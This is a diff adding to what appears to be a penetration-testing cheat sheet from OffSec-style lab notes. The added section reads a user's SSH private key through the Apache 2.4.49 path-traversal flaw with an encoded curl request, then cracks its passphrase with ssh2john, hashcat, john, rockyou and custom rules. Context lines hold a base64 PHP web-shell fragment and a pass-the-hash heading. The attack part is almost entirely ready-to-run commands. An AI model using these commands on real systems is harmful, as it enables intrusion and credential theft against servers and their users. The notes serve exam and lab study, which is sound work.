@@ -698,6 +698,24 @@ NobyBzeXN0ZW0oJF9HRVRbImNtZCJdKTs/Pg==&cmd=ls"`
   chmod 600 id_rsa
   ssh -i id_rsa -p 2222 dave@192.168.50.201 #login
   ```
+- ssh passphrase via path traversal "Apache 2.4.49"
+  - `searchsploit "Apache 2.4.49"`  #HTTP Server 2.4.49 - Path Traversal & Remote Code Execution (RCE)
+  - Read id_rsa key
+    `curl --path-as-is http://192.168.161.201/cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/home/alfred/.ssh/id_rsa -o id_rsa`  
+  - Crack password
+    ```
+    nano ssh.rule
+    [List.Rules:sshRules]
+    c $1 $3 $7 $!  
+    c $1 $3 $7 $@  
+    c $1 $3 $7 $#  
+
+    ssh2john id_rsa > ssh.hash
+
+    hashcat -m 22921 ssh.hash ssh.passwords -r ssh.rule --force
+    sudo sh -c 'cat /home/kali/offsec/passwordattacks/ssh.rule >> /etc/john/john.conf'
+    john --wordlist=/usr/share/wordlists/rockyou.txt --rules=sshRules ssh.hash
+    ```
 - Passing NTLM (User + Hash)  
   - scenario: user from FILES01 extract admin hash and authenticate to FILES02 SMB share  
   ```
